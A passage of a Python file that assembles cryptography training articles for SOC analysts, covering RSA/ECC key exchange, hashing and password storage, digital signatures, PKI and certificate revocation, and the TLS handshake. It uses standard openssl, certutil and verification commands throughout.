RC4-SHA               # RC4 - broken
EXP-*                 # Export-grade - broken
NULL-*                # No encryption
*-CBC-*               # CBC without authentication (check for AEAD alternative)
```

## Key Takeaways

1. AES-256-GCM is the gold standard for symmetric encryption
2. ECB mode leaks patterns and must never be used
3. Always use authenticated encryption (AEAD) for new systems
4. DES and 3DES are deprecated - flag any usage immediately
5. Hardware AES-NI makes AES extremely fast on modern CPUs
6. Key management is harder than the algorithm choice itself
"""
    ))

    # --------------------------------------------------------------------------
    # Article 2: Asymmetric Encryption RSA ECC and Key Exchange
    # --------------------------------------------------------------------------
    articles.append((
        "Asymmetric Encryption RSA ECC and Key Exchange",
        ["cryptography", "asymmetric-encryption", "rsa", "ecc", "diffie-hellman", "key-exchange"],
        r"""# Asymmetric Encryption: RSA, ECC, and Key Exchange

## Overview

Asymmetric (public-key) cryptography uses a **key pair**: a public key anyone can have,
and a private key kept secret. Data encrypted with the public key can only be decrypted
with the corresponding private key, and vice versa.

## The Public/Private Key Concept

```
Alice generates:  (PublicKey_A, PrivateKey_A)
Bob generates:    (PublicKey_B, PrivateKey_B)

Encryption:  Alice encrypts with PublicKey_B  -> Only Bob can decrypt with PrivateKey_B
Signing:     Alice signs with PrivateKey_A    -> Anyone verifies with PublicKey_A
```

| Operation    | Key Used       | Purpose                    |
|-------------|----------------|----------------------------|
| Encrypt     | Public key     | Confidentiality            |
| Decrypt     | Private key    | Access encrypted data      |
| Sign        | Private key    | Authentication, integrity  |
| Verify      | Public key     | Validate signature         |

## RSA (Rivest-Shamir-Adleman)

RSA security rests on the difficulty of factoring large numbers.

### Simplified Math

```
1. Choose two large primes: p, q
2. Compute n = p * q         (modulus, part of both keys)
3. Compute phi = (p-1)(q-1)  (Euler's totient)
4. Choose e such that 1 < e < phi and gcd(e, phi) = 1   (public exponent, commonly 65537)
5. Compute d = e^(-1) mod phi  (private exponent)

Public key:  (n, e)
Private key: (n, d)

Encrypt: C = M^e mod n
Decrypt: M = C^d mod n
```

### RSA Key Sizes

| Key Size | Security Level | Status          | Recommended Use        |
|----------|---------------|-----------------|------------------------|
| 1024-bit | ~80-bit       | BROKEN          | Do not use             |
| 2048-bit | ~112-bit      | Minimum         | Short-term use         |
| 3072-bit | ~128-bit      | Good            | General use through 2030|
| 4096-bit | ~140-bit      | Strong          | Long-term, CA roots    |

### Generate RSA Keys with OpenSSL

```bash
# Generate 4096-bit RSA private key
openssl genrsa -out private.pem 4096

# Extract public key
openssl rsa -in private.pem -pubout -out public.pem

# View key details
openssl rsa -in private.pem -text -noout

# Encrypt a file with RSA public key
openssl rsautl -encrypt -pubin -inkey public.pem -in secret.txt -out secret.enc

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in secret.enc -out secret.txt
```

## ECC (Elliptic Curve Cryptography)

ECC achieves equivalent security with much smaller keys by relying on the difficulty
of the Elliptic Curve Discrete Logarithm Problem (ECDLP).

### Key Size Comparison

| Security Level | RSA Key Size | ECC Key Size | Ratio  |
|---------------|-------------|-------------|--------|
| 80-bit        | 1024-bit    | 160-bit     | 6:1    |
| 112-bit       | 2048-bit    | 224-bit     | 9:1    |
| 128-bit       | 3072-bit    | 256-bit     | 12:1   |
| 192-bit       | 7680-bit    | 384-bit     | 20:1   |
| 256-bit       | 15360-bit   | 521-bit     | 30:1   |

### Common Curves

| Curve      | Key Size | Usage                        |
|------------|----------|------------------------------|
| P-256      | 256-bit  | TLS, general purpose         |
| P-384      | 384-bit  | Government, high security    |
| P-521      | 521-bit  | Maximum NIST security        |
| Curve25519 | 256-bit  | Modern protocols (Signal, SSH)|
| Ed25519    | 256-bit  | Signatures (SSH, GPG)        |

```bash
# Generate ECC private key (P-256)
openssl ecparam -genkey -name prime256v1 -out ec_private.pem

# Generate using Ed25519 (modern, fast)
openssl genpkey -algorithm Ed25519 -out ed25519_private.pem

# View curve details
openssl ecparam -name prime256v1 -text -noout

# List available curves
openssl ecparam -list_curves
```

## Diffie-Hellman Key Exchange

DH allows two parties to agree on a shared secret over an insecure channel without
ever transmitting the secret.

```
1. Alice and Bob agree on public parameters (p, g)
2. Alice picks private a, computes A = g^a mod p, sends A to Bob
3. Bob picks private b, computes B = g^b mod p, sends B to Alice
4. Alice computes: shared = B^a mod p
5. Bob computes:   shared = A^b mod p
   Both get the same value: g^(ab) mod p
```

### ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)

Modern TLS uses ECDHE for key exchange:

- **Ephemeral**: New key pair generated per session (perfect forward secrecy)
- **Elliptic Curve**: Smaller keys, faster computation
- Standard in TLS 1.3

```bash
# Generate DH parameters
openssl dhparam -out dhparams.pem 2048

# Generate ECDH key pair
openssl ecparam -genkey -name prime256v1 -out ecdh_key.pem
```

## Hybrid Encryption

In practice, asymmetric encryption is too slow for bulk data. Systems use hybrid encryption:

```
1. Generate random symmetric key (e.g., AES-256 key)
2. Encrypt data with symmetric key  (fast)
3. Encrypt symmetric key with recipient's public key (small data, OK for RSA/ECC)
4. Send both encrypted data and encrypted key

Recipient:
1. Decrypt symmetric key with private key
2. Decrypt data with symmetric key
```

This pattern is used in TLS, PGP/GPG, S/MIME, and most real-world encryption systems.

## Real-World Usage Map

| Protocol/System | Asymmetric Component      | Symmetric Component |
|----------------|--------------------------|---------------------|
| TLS 1.3        | ECDHE key exchange       | AES-256-GCM         |
| SSH             | RSA/Ed25519 auth         | ChaCha20 or AES-CTR |
| PGP/GPG        | RSA/ECC encrypt session key | AES-256           |
| S/MIME          | RSA encrypt session key  | AES-256-CBC         |
| Bitcoin         | ECDSA (secp256k1)        | SHA-256 (hashing)   |
| Signal          | X25519 key exchange      | AES-256-CBC         |

## SOC Analyst Actions

```bash
# Check what key exchange a server supports
openssl s_client -connect example.com:443 2>/dev/null | grep -E "Server public key|Cipher"

# Verify RSA key strength
openssl rsa -in key.pem -text -noout | head -1
# Should show "Private-Key: (2048 bit)" or higher

# Check certificate's public key algorithm
openssl x509 -in cert.pem -text -noout | grep "Public Key Algorithm"

# Test for weak DH parameters
openssl s_client -connect example.com:443 -cipher DHE 2>/dev/null | grep "Server Temp Key"
```

## Quantum Computing Threat

| Algorithm | Quantum Threat | Post-Quantum Status    |
|-----------|---------------|------------------------|
| RSA       | Broken by Shor's algorithm | Migrate to PQC  |
| ECC       | Broken by Shor's algorithm | Migrate to PQC  |
| DH        | Broken by Shor's algorithm | Migrate to PQC  |
| AES-256   | Grover halves key strength | Still secure     |

NIST post-quantum standards (2024): ML-KEM (Kyber), ML-DSA (Dilithium), SLH-DSA (SPHINCS+).

## Key Takeaways

1. RSA minimum 2048-bit; prefer 3072+ or ECC for new systems
2. ECC provides equivalent security with much smaller keys
3. ECDHE provides perfect forward secrecy in TLS
4. Hybrid encryption combines asymmetric and symmetric for real-world use
5. Monitor for quantum computing developments; plan PQC migration
6. Ed25519/Curve25519 are the modern standard for signatures and key exchange
"""
    ))

    # --------------------------------------------------------------------------
    # Article 3: Hashing Algorithms MD5 SHA Family and Integrity
    # --------------------------------------------------------------------------
    articles.append((
        "Hashing Algorithms MD5 SHA Family and Integrity",
        ["cryptography", "hashing", "md5", "sha", "integrity", "hmac", "password-hashing"],
        r"""# Hashing Algorithms: MD5, SHA Family, and Integrity

## Overview

A cryptographic hash function takes arbitrary input and produces a fixed-size output
(digest) with these properties:

- **Deterministic**: Same input always produces same output
- **One-way**: Cannot reverse the hash to get input (preimage resistance)
- **Collision resistant**: Infeasible to find two inputs with same hash
- **Avalanche effect**: Small input change produces completely different hash

## Hash Algorithm Comparison

| Algorithm | Output Size | Block Size | Status      | Use Case            |
|-----------|------------|------------|-------------|---------------------|
| MD5       | 128-bit    | 512-bit    | BROKEN      | Legacy checksums    |
| SHA-1     | 160-bit    | 512-bit    | BROKEN      | Legacy, git (moving)|
| SHA-224   | 224-bit    | 512-bit    | OK          | Rarely used         |
| SHA-256   | 256-bit    | 512-bit    | SECURE      | Standard choice     |
| SHA-384   | 384-bit    | 1024-bit   | SECURE      | High security       |
| SHA-512   | 512-bit    | 1024-bit   | SECURE      | High security       |
| SHA-3-256 | 256-bit    | 1088-bit   | SECURE      | Alternative to SHA-2|
| BLAKE2b   | Up to 512  | Variable   | SECURE      | Fast, modern        |
| BLAKE3    | 256-bit    | Variable   | SECURE      | Very fast, modern   |

## MD5 - Broken but Ubiquitous

MD5 produces a 128-bit (16-byte) hash. Collisions demonstrated in 2004.

```bash
# Generate MD5 hash
echo -n "Hello World" | md5sum
# b10a8db164e0754105b7a99be72e3fe5

# Windows
certutil -hashfile myfile.txt MD5

# MD5 collision: two different files can produce the same hash
# This is why MD5 must not be used for security purposes
```

**SOC Note**: You will still see MD5 in IoC feeds and malware databases. It is acceptable
for quick lookups but always cross-reference with SHA-256.

## SHA-1 - Deprecated

SHA-1 produces a 160-bit hash. Google demonstrated a practical collision in 2017 (SHAttered).

```bash
echo -n "Hello World" | sha1sum
# 0a4d55a8d778e5022fab701977c5d840bbc486d0

# Windows
certutil -hashfile myfile.txt SHA1
```

**SOC Note**: CAs stopped issuing SHA-1 certificates in 2016. Flag any SHA-1 cert as critical.

## SHA-256 - The Standard

SHA-256 produces a 256-bit hash. Part of the SHA-2 family. No known practical attacks.

```bash
# Linux
echo -n "Hello World" | sha256sum
# a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e

# Windows
certutil -hashfile myfile.txt SHA256

# OpenSSL
openssl dgst -sha256 myfile.txt

# Python one-liner
python3 -c "import hashlib; print(hashlib.sha256(b'Hello World').hexdigest())"

# Hash a directory of files
find /path -type f -exec sha256sum {} \; > checksums.txt

# Verify checksums
sha256sum -c checksums.txt
```

## HMAC (Hash-based Message Authentication Code)

HMAC combines a hash function with a secret key to provide both integrity and authentication.

```
HMAC(K, M) = H((K XOR opad) || H((K XOR ipad) || M))
```

```bash
# Generate HMAC-SHA256
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"

# In Python
python3 -c "
import hmac, hashlib
h = hmac.new(b'secret_key', b'message', hashlib.sha256)
print(h.hexdigest())
"
```

| Property       | Plain Hash    | HMAC              |
|---------------|---------------|-------------------|
| Integrity     | Yes           | Yes               |
| Authentication| No            | Yes (needs key)   |
| Tamper-proof  | No            | Yes               |
| Use case      | Checksums     | API auth, tokens  |

## Password Hashing

**Never use plain hashes (MD5, SHA-256) for passwords.** Use purpose-built password
hashing functions that are deliberately slow and include salts.

| Algorithm | Status        | Parameters                     | Notes                |
|-----------|--------------|--------------------------------|----------------------|
| bcrypt    | Good         | Cost factor (12+)              | 72-byte input limit  |
| scrypt    | Good         | N, r, p (CPU, memory, parallel)| Memory-hard           |
| Argon2id  | Best         | Time, memory, parallelism      | Winner of PHC (2015) |
| PBKDF2    | Acceptable   | Iterations (600000+)           | NIST approved        |

```bash
# Generate bcrypt hash (Python)
python3 -c "
import bcrypt
password = b'MySecurePassword123'
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)
print(hashed.decode())
"

# Verify password
python3 -c "
import bcrypt
stored = b'...'  # stored hash
if bcrypt.checkpw(b'MySecurePassword123', stored):
    print('Password matches')
"

# Generate Argon2 hash
python3 -c "
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
h = ph.hash('MySecurePassword123')
print(h)
"
```

## File Integrity Checking

### Creating Baselines

```bash
# Create SHA-256 checksums for critical system files
find /etc -type f -exec sha256sum {} \; > /root/etc_baseline.sha256
find /usr/bin -type f -exec sha256sum {} \; > /root/usrbin_baseline.sha256

# Windows - hash critical files
Get-ChildItem C:\Windows\System32\*.dll | ForEach-Object {
    Get-FileHash $_.FullName -Algorithm SHA256
} | Export-Csv baseline.csv
```

### Verifying Integrity

```bash
# Linux - compare against baseline
sha256sum -c /root/etc_baseline.sha256 2>/dev/null | grep FAILED

# Windows PowerShell
$baseline = Import-Csv baseline.csv
foreach ($entry in $baseline) {
    $current = Get-FileHash $entry.Path -Algorithm SHA256
    if ($current.Hash -ne $entry.Hash) {
        Write-Warning "MODIFIED: $($entry.Path)"
    }
}
```

### Verifying Downloads

```bash
# Download and verify a file
wget https://example.com/software.tar.gz
wget https://example.com/software.tar.gz.sha256
sha256sum -c software.tar.gz.sha256

# Verify a GPG-signed checksum file
gpg --verify SHA256SUMS.gpg SHA256SUMS
sha256sum -c SHA256SUMS
```

## SOC Analyst Hash Investigation Workflow

```
1. Extract hash from alert/IoC
2. Classify hash type by length:
   - 32 hex chars = MD5
   - 40 hex chars = SHA-1
   - 64 hex chars = SHA-256
3. Search threat intelligence:
   - VirusTotal: https://www.virustotal.com/gui/search/{hash}
   - Hybrid Analysis, MalwareBazaar, OTX
4. Cross-reference with SIEM/EDR logs
5. If malicious: identify affected hosts, scope impact
```

## Key Takeaways

1. SHA-256 is the standard; use it for all new integrity checks
2. MD5 and SHA-1 are broken for security but still seen in IoC feeds
3. HMAC adds authentication on top of hashing - use for API tokens and message auth
4. Never hash passwords with MD5/SHA - use bcrypt, scrypt, or Argon2id
5. Maintain file integrity baselines for critical systems
6. Hash length instantly tells you the algorithm in most cases
"""
    ))

    # --------------------------------------------------------------------------
    # Article 4: Digital Signatures and Non-Repudiation
    # --------------------------------------------------------------------------
    articles.append((
        "Digital Signatures and Non-Repudiation",
        ["cryptography", "digital-signatures", "non-repudiation", "code-signing", "dsa", "ecdsa"],
        r"""# Digital Signatures and Non-Repudiation

## Overview

A digital signature provides three guarantees:

- **Authentication**: Proves who signed the data
- **Integrity**: Proves the data has not been altered
- **Non-repudiation**: The signer cannot deny signing

Unlike encryption (which hides data), signatures prove origin and integrity.

## How Digital Signatures Work

```
Signing Process:
1. Hash the message:           digest = SHA-256(message)
2. Encrypt hash with private key: signature = Sign(digest, PrivateKey)
3. Send message + signature

Verification Process:
1. Hash the received message:  digest1 = SHA-256(message)
2. Decrypt signature with public key: digest2 = Verify(signature, PublicKey)
3. Compare: if digest1 == digest2, signature is valid
```

## Signing vs Encryption

| Property       | Digital Signature         | Encryption                |
|---------------|--------------------------|---------------------------|
| Key used       | Private key to sign      | Public key to encrypt     |
| Purpose        | Authentication/integrity | Confidentiality           |
| Who can verify | Anyone (public key)      | Only recipient (private)  |
| Non-repudiation| Yes                      | No                        |
| Data visible   | Yes (signed, not hidden) | No (encrypted)            |

## Signature Algorithms

### RSA Signatures

```bash
# Sign a file with RSA
openssl dgst -sha256 -sign private.pem -out signature.bin document.pdf

# Verify the signature
openssl dgst -sha256 -verify public.pem -signature signature.bin document.pdf
# Output: "Verified OK" or "Verification Failure"
```

### DSA (Digital Signature Algorithm)

DSA is signature-only (cannot encrypt). Largely superseded by ECDSA.

- Key sizes: 1024-3072 bits
- NIST standard (FIPS 186)
- Slower than RSA for verification

### ECDSA (Elliptic Curve DSA)

ECDSA provides equivalent security with smaller keys and faster operations.

```bash
# Generate ECDSA key pair
openssl ecparam -genkey -name prime256v1 -out ec_private.pem
openssl ec -in ec_private.pem -pubout -out ec_public.pem

# Sign with ECDSA
openssl dgst -sha256 -sign ec_private.pem -out signature.bin document.pdf

# Verify
openssl dgst -sha256 -verify ec_public.pem -signature signature.bin document.pdf
```

### Ed25519 (EdDSA)

Modern signature scheme. Deterministic (no random nonce needed), fast, and resistant
to implementation errors.

```bash
# Generate Ed25519 key
openssl genpkey -algorithm Ed25519 -out ed25519_private.pem
openssl pkey -in ed25519_private.pem -pubout -out ed25519_public.pem

# Sign
openssl pkeyutl -sign -inkey ed25519_private.pem -in document.pdf -out signature.bin -rawin

# Verify
openssl pkeyutl -verify -pubin -inkey ed25519_public.pem -in document.pdf -sigfile signature.bin -rawin
```

| Algorithm | Key Size      | Signature Size | Speed       | Status     |
|-----------|--------------|----------------|-------------|------------|
| RSA-2048  | 2048-bit     | 256 bytes      | Slow sign   | Standard   |
| DSA-2048  | 2048-bit     | ~64 bytes      | Slow verify | Legacy     |
| ECDSA-256 | 256-bit      | ~64 bytes      | Fast        | Standard   |
| Ed25519   | 256-bit      | 64 bytes       | Very fast   | Modern     |

## Code Signing

Code signing ensures software has not been tampered with and identifies the publisher.

### Windows Code Signing

```powershell
# Sign with signtool (Windows SDK)
signtool sign /f certificate.pfx /p password /t http://timestamp.digicert.com /fd sha256 application.exe

# Verify a signed executable
signtool verify /pa /v application.exe

# Check signature via PowerShell
Get-AuthenticodeSignature -FilePath application.exe
```

### Linux Code Signing

```bash
# Sign an RPM package
rpmsign --addsign package.rpm

# Verify RPM signature
rpm --checksig package.rpm

# Sign with GPG
gpg --detach-sign --armor application.tar.gz

# Verify GPG signature
gpg --verify application.tar.gz.asc application.tar.gz
```

### Container Image Signing

```bash
# Sign with cosign (Sigstore)
cosign sign --key cosign.key registry.example.com/myapp:latest

# Verify
cosign verify --key cosign.pub registry.example.com/myapp:latest
```

## Document Signing

```bash
# Sign a PDF with OpenSSL (create PKCS#7 detached signature)
openssl smime -sign -in document.pdf -out document.pdf.p7s -signer cert.pem -inkey key.pem -outform DER -nodetach

# Java JAR signing
jarsigner -keystore keystore.jks -signedjar signed.jar unsigned.jar alias_name
jarsigner -verify signed.jar
```

## Timestamp Authorities

Timestamps prove a signature existed at a specific time, keeping it valid even after
the certificate expires.

```bash
# Create a timestamp request
openssl ts -query -data document.pdf -sha256 -out request.tsq

# Use a TSA to get the timestamp
curl -H "Content-Type: application/timestamp-query" --data-binary @request.tsq http://timestamp.example.com/tsa -o response.tsr

# Verify timestamp
openssl ts -verify -data document.pdf -in response.tsr -CAfile ca-cert.pem
```

## SOC Investigation: Verifying Signatures

```bash
# Check if a Windows binary is signed
signtool verify /pa /v suspicious.exe 2>&1

# Check certificate chain of a signed file
powershell -Command "(Get-AuthenticodeSignature suspicious.exe).SignerCertificate | Format-List"

# Verify GPG signature on a downloaded tool
gpg --keyserver hkps://keyserver.ubuntu.com --recv-keys <KEY_ID>
gpg --verify tool.tar.gz.asc tool.tar.gz

# Check SSL certificate signature
openssl x509 -in cert.pem -text -noout | grep -A 2 "Signature Algorithm"
```

## Common Signature Verification Failures

| Error                          | Cause                              | Action                    |
|-------------------------------|------------------------------------|---------------------------|
| Certificate expired           | Signing cert past validity         | Check for timestamp       |
| Certificate revoked           | CA revoked the certificate         | Do not trust              |
| Unknown CA                    | Root CA not in trust store         | Verify CA legitimacy      |
| Hash mismatch                 | File was modified after signing    | Treat as tampered         |
| Timestamp missing             | No trusted timestamp               | Signature only valid while cert valid |
| Self-signed                   | Not issued by trusted CA           | Additional verification needed |

## Key Takeaways

1. Digital signatures prove who signed and that content was not modified
2. Non-repudiation means the signer cannot deny the action
3. ECDSA and Ed25519 are preferred over RSA for new signature implementations
4. Code signing is critical for supply chain security
5. Timestamps extend signature validity beyond certificate expiration
6. Always verify signatures on downloaded software and security tools
"""
    ))

    # --------------------------------------------------------------------------
    # Article 5: PKI and Certificate Authorities
    # --------------------------------------------------------------------------
    articles.append((
        "PKI and Certificate Authorities",
        ["cryptography", "pki", "certificate-authority", "certificates", "trust-chain", "ocsp", "crl"],
        r"""# PKI and Certificate Authorities

## Overview

Public Key Infrastructure (PKI) is the framework of policies, procedures, hardware,
software, and people needed to create, manage, distribute, use, store, and revoke
digital certificates. PKI binds public keys to identities through trusted third parties
called Certificate Authorities (CAs).

## PKI Components

| Component                 | Role                                               |
|--------------------------|----------------------------------------------------|
| Certificate Authority (CA)| Issues and signs digital certificates              |
| Registration Authority (RA)| Verifies identity before CA issues certificate    |
| Certificate Revocation List (CRL) | List of revoked certificates             |
| OCSP Responder           | Real-time certificate status checking               |
| Certificate Store        | Local storage of trusted certificates               |
| Certificate Database     | CA's record of all issued certificates              |
| Key Recovery Agent       | Recovers lost private keys (when escrowed)          |

## Certificate Hierarchy

```
Root CA (self-signed, offline, in vault)
  |
  +-- Intermediate CA (Issuing CA, online)
  |     |
  |     +-- Leaf Certificate (server, user, device)
  |     +-- Leaf Certificate
  |
  +-- Intermediate CA (Policy CA)
        |
        +-- Leaf Certificate
```

### Why Intermediate CAs?

- **Root CA stays offline** (air-gapped, HSM-stored) reducing compromise risk
- If an Intermediate CA is compromised, only that branch is affected
- Root revokes the Intermediate; issues new one
- Root CA private key typically has 20-30 year lifetime

## Trust Chains

When your browser connects to `https://example.com`:

```
1. Server presents: [Leaf Cert] + [Intermediate Cert]
2. Browser checks: Leaf signed by Intermediate? YES
3. Browser checks: Intermediate signed by Root?   YES
4. Browser checks: Root in local trust store?      YES
5. All checks pass -> Connection trusted
```

```bash
# View the full certificate chain
openssl s_client -connect example.com:443 -showcerts

# Verify a certificate chain
openssl verify -CAfile root_ca.pem -untrusted intermediate.pem server_cert.pem

# View trust store on Linux
ls /etc/ssl/certs/
awk -v cmd='openssl x509 -noout -subject' '/BEGIN/{close(cmd)};{print | cmd}' /etc/ssl/certs/ca-certificates.crt

# Windows - view trust store
certutil -store Root
certutil -store CA
```

## Certificate Lifecycle

```
1. Key Generation    -> Generate public/private key pair
2. CSR Creation      -> Create Certificate Signing Request
3. Validation        -> RA verifies identity/domain ownership
4. Issuance          -> CA signs certificate
5. Installation      -> Deploy cert on server/device
6. Monitoring        -> Track expiration, check revocation
7. Renewal           -> Request new cert before expiration
8. Revocation        -> Revoke if key compromised or no longer needed
```

### CSR Generation

```bash
# Generate key and CSR in one command
openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr \
  -subj "/C=US/ST=California/L=San Francisco/O=MyOrg/CN=www.example.com"

# View CSR contents
openssl req -in server.csr -text -noout

# Generate CSR with Subject Alternative Names
openssl req -new -key server.key -out server.csr -config <(cat <<-END
[req]
default_bits = 2048
prompt = no
distinguished_name = dn
req_extensions = san
[dn]
CN = www.example.com
O = MyOrg
[san]
subjectAltName = DNS:www.example.com,DNS:example.com,DNS:api.example.com
END
)
```

## Certificate Revocation

### CRL (Certificate Revocation List)

```bash
# Download and inspect a CRL
wget http://crl.example.com/root.crl
openssl crl -in root.crl -text -noout

# Check if a cert is on the CRL
openssl verify -crl_check -CAfile ca.pem -CRLfile root.crl cert.pem
```

| CRL Property     | Details                            |
|------------------|------------------------------------|
| Distribution     | HTTP URL in certificate            |
| Update frequency | Hours to days                      |
| Size             | Can be very large (MBs)           |
| Drawback         | Client must download entire list   |

### OCSP (Online Certificate Status Protocol)

```bash
# Check certificate status via OCSP
openssl ocsp -issuer intermediate.pem -cert server.pem \
  -url http://ocsp.example.com -CAfile root.pem

# Extract OCSP URL from certificate
openssl x509 -in cert.pem -noout -ocsp_uri
```

| OCSP Property     | Details                           |
|-------------------|------------------------------------|
| Response time     | Real-time                          |
| Data transferred  | Small (single cert status)         |
| Privacy concern   | CA knows which sites you visit     |
| OCSP Stapling     | Server fetches OCSP and sends with cert |

### OCSP Stapling

The server periodically fetches its own OCSP response and "staples" it to the TLS handshake.
This is preferred because it preserves client privacy and reduces CA load.

```bash
# Test OCSP stapling
openssl s_client -connect example.com:443 -status
# Look for "OCSP Response Status: successful"
```

## Enterprise PKI Design

### Two-Tier Architecture (Recommended)

```
Offline Root CA (HSM, vault)
    |
    +-- Online Issuing CA 1 (servers)
    +-- Online Issuing CA 2 (users)
    +-- Online Issuing CA 3 (devices)
```

### Windows AD Certificate Services

```powershell
# List installed CAs
certutil -config - -ping

# Request a certificate
certreq -submit -attrib "CertificateTemplate:WebServer" request.csr cert.cer

# View CA database
certutil -view -restrict "Disposition=20" -out "CommonName,NotAfter"

# Export CA certificate
certutil -ca.cert ca_cert.cer
```

## SOC Analyst Certificate Investigation

```bash
# Full certificate inspection
openssl x509 -in cert.pem -text -noout

# Key fields to check:
# - Issuer: Who issued this cert?
# - Subject: Who is this cert for?
# - Validity: Not Before / Not After
# - Subject Alternative Name: All covered domains
# - Key Usage: What operations are allowed
# - Basic Constraints: Is this a CA cert?

# Check remote server certificate
echo | openssl s_client -connect suspicious-site.com:443 2>/dev/null | openssl x509 -text -noout

# Check expiration of all certs in a directory
for cert in /etc/ssl/certs/*.pem; do
    echo "$cert: $(openssl x509 -enddate -noout -in $cert)"
done
```

## Common PKI Issues

| Issue                    | Symptom                            | Resolution                |
|-------------------------|------------------------------------|---------------------------|
| Expired certificate     | Browser warning, connection fail   | Renew certificate         |
| Missing intermediate    | Trust error on some clients        | Include full chain        |
| Wrong hostname          | CN/SAN mismatch error              | Reissue with correct names|
| Self-signed in prod     | Not trusted by clients             | Use CA-issued certificate |
| Revoked certificate     | OCSP/CRL check fails               | Reissue new certificate   |
| Weak key                | Compliance scan failure            | Regenerate with 2048+ bit|

## Key Takeaways

1. PKI creates a chain of trust from Root CA to end-entity certificates
2. Root CAs must be kept offline in HSMs for maximum security
3. Two-tier (Root + Issuing) is the recommended enterprise architecture
4. OCSP Stapling is preferred over CRLs for revocation checking
5. Always include the full certificate chain when deploying certs
6. Monitor certificate expiration dates proactively
"""
    ))

    # --------------------------------------------------------------------------
    # Article 6: TLS Handshake Deep Dive
    # --------------------------------------------------------------------------
    articles.append((
        "TLS Handshake Deep Dive",
        ["cryptography", "tls", "ssl", "handshake", "cipher-suites", "https", "transport-security"],
        r"""# TLS Handshake Deep Dive

## Overview

Transport Layer Security (TLS) secures communication between clients and servers.
It provides confidentiality, integrity, and authentication. Understanding the handshake
is critical for SOC analysts investigating connection issues, misconfigurations, and attacks.

## TLS Version History

| Version  | Year | Status          | Key Changes                        |
|----------|------|-----------------|------------------------------------|
| SSL 2.0  | 1995 | INSECURE        | First public version               |
| SSL 3.0  | 1996 | INSECURE        | Complete redesign (POODLE attack)  |
| TLS 1.0  | 1999 | DEPRECATED      | SSL 3.0 successor (BEAST attack)  |
| TLS 1.1  | 2006 | DEPRECATED      | IV fix for CBC                     |
| TLS 1.2  | 2008 | CURRENT         | AEAD ciphers, flexible hash        |
| TLS 1.3  | 2018 | CURRENT (best)  | Faster, simpler, more secure       |

## TLS 1.2 Handshake (2-RTT)

```
Client                                          Server
  |                                                |
  |--- ClientHello (versions, cipher suites, random) -->|
  |                                                |
  |<-- ServerHello (chosen cipher, random) --------|
  |<-- Certificate (server's X.509 cert) ----------|
  |<-- ServerKeyExchange (DH/ECDHE params) --------|
  |<-- ServerHelloDone -----------------------------|
  |                                                |
  |--- ClientKeyExchange (premaster secret) ------->|
  |--- ChangeCipherSpec --------------------------->|
  |--- Finished (encrypted) ----------------------->|
  |                                                |
  |<-- ChangeCipherSpec ----------------------------|
  |<-- Finished (encrypted) ------------------------|
  |                                                |
  |<========= Application Data (encrypted) =======>|
```

**Key steps:**
1. Client sends supported cipher suites and random bytes
2. Server selects cipher suite and sends certificate
3. Key exchange produces shared premaster secret
4. Both derive session keys from random bytes + premaster secret
5. Both confirm with Finished messages encrypted with new keys

## TLS 1.3 Handshake (1-RTT)

```
Client                                          Server
  |                                                |
  |--- ClientHello (versions, key_share, random) -->|
  |                                                |
  |<-- ServerHello (chosen cipher, key_share) ------|
  |<-- EncryptedExtensions --------------------------|
  |<-- Certificate ----------------------------------|
  |<-- CertificateVerify ----------------------------|
  |<-- Finished --------------------------------------|
  |                                                |
  |--- Finished ------------------------------------>|
  |                                                |
  |<========= Application Data (encrypted) =======>|
```

**TLS 1.3 improvements:**
- Only 1 round trip (vs 2 in TLS 1.2)
- 0-RTT resumption possible (with replay risk)
- No RSA key exchange (ECDHE only = mandatory forward secrecy)
- Removed insecure features: RC4, DES, 3DES, CBC, SHA-1, static RSA, compression

## Cipher Suite Notation

### TLS 1.2 Format
```
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 |    |     |         |    |    |
 |    |     |         |    |    +-- PRF hash
 |    |     |         |    +------- Mode (GCM = AEAD)
 |    |     |         +------------ Cipher + key size
 |    |     +---------------------- Authentication
 |    +---------------------------- Key Exchange
 +--------------------------------- Protocol
```

### TLS 1.3 Format (Simplified)
```
TLS_AES_256_GCM_SHA384
 |    |    |    |
 |    |    |    +-- Hash for HKDF
 |    |    +------- Mode
 |    +------------ Cipher + key size
 +----------------- Protocol
```

TLS 1.3 only supports 5 cipher suites:
- `TLS_AES_256_GCM_SHA384`
- `TLS_AES_128_GCM_SHA256`
- `TLS_CHACHA20_POLY1305_SHA256`
- `TLS_AES_128_CCM_SHA256`
- `TLS_AES_128_CCM_8_SHA256`

## Certificate Validation During Handshake

```
1. Is the certificate expired?              -> Check NotBefore/NotAfter
2. Is the hostname correct?                 -> Check CN and SAN
3. Is the issuer trusted?                   -> Walk the chain to trusted root
4. Is the certificate revoked?              -> Check OCSP/CRL
5. Are the key usage extensions correct?    -> Check for serverAuth
6. Is the signature algorithm acceptable?   -> No MD5, no SHA-1
```

```bash
# Test TLS connection and see certificate details
openssl s_client -connect example.com:443 -servername example.com

# Test specific TLS version
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3

# Show negotiated cipher
openssl s_client -connect example.com:443 2>/dev/null | grep "Cipher is"

# Test all supported ciphers
nmap --script ssl-enum-ciphers -p 443 example.com
```

## Session Resumption

### TLS 1.2: Session IDs and Session Tickets

```
Session ID:  Server stores session state, client sends ID to resume
Session Ticket: Server encrypts session state, gives to client
```

### TLS 1.3: PSK (Pre-Shared Key)

```
0-RTT Resumption:
Client sends encrypted data in the first message using a PSK from a previous session.
Risk: 0-RTT data is replayable. Only use for idempotent requests.
```

## Common TLS Attacks

| Attack       | Targets     | Description                              | Mitigation             |
|-------------|-------------|------------------------------------------|------------------------|
| POODLE      | SSL 3.0     | Padding oracle on CBC in SSL 3.0         | Disable SSL 3.0        |
| BEAST       | TLS 1.0     | CBC IV prediction                        | Use TLS 1.2+           |
| Heartbleed  | OpenSSL     | Buffer over-read leaks memory            | Patch OpenSSL          |
| CRIME       | TLS         | Compression side-channel                 | Disable TLS compression|
| BREACH      | HTTP        | HTTP compression side-channel            | Disable HTTP compress  |
| FREAK       | TLS         | Forces export-grade RSA                  | Disable export ciphers |
